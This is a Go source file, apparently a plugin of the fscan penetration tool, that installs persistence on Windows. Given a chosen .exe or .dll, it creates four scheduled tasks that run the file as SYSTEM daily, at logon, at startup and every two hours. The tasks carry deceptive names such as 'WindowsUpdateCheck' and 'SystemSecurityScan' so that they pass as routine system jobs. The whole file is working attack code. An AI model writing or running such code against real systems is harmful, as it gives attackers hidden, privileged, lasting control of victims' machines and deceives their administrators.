//go:build (plugin_winschtask || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinSchTaskPlugin struct {
	plugins.BasePlugin
}

func NewWinSchTaskPlugin() *WinSchTaskPlugin {
	return &WinSchTaskPlugin{
		BasePlugin: plugins.NewBasePlugin("winschtask"),
	}
}

func (p *WinSchTaskPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("未指定PE文件，使用 -win-pe 参数")}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("PE文件不存在: %s", pePath)}
	}
	ext := strings.ToLower(filepath.Ext(pePath))
	if ext != ".exe" && ext != ".dll" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("无效的PE文件: %s", pePath)}
	}

	absPath, _ := filepath.Abs(pePath)
	baseName := strings.TrimSuffix(filepath.Base(absPath), filepath.Ext(absPath))

	tasks := []struct {
		name     string
		schedule string
		modifier string
	}{
		{fmt.Sprintf("WindowsUpdateCheck_%s", baseName), "DAILY", "1"},
		{fmt.Sprintf("SystemSecurityScan_%s", baseName), "ONLOGON", ""},
		{fmt.Sprintf("MaintenanceTask_%s", baseName), "ONSTART", ""},
		{fmt.Sprintf("BackgroundService_%s", baseName), "HOURLY", "2"},
	}

	var output strings.Builder
	var successCount int

	for _, task := range tasks {
		args := []string{"/create", "/tn", task.name, "/tr", absPath, "/sc", task.schedule}
		if task.modifier != "" {
			args = append(args, "/mo", task.modifier)
		}
		args = append(args, "/ru", "SYSTEM", "/f")

		cmd := exec.Command("schtasks", args...)
		out, err := cmd.CombinedOutput()
		result := strings.TrimSpace(string(out))
		if err != nil {
			output.WriteString(fmt.Sprintf("[失败] %s: %s\n", task.name, result))
			continue
		}
		output.WriteString(fmt.Sprintf("[成功] %s (%s)\n", task.name, task.schedule))
		successCount++
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winschtask_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winschtask", func() Plugin {
		return NewWinSchTaskPlugin()
	})
}
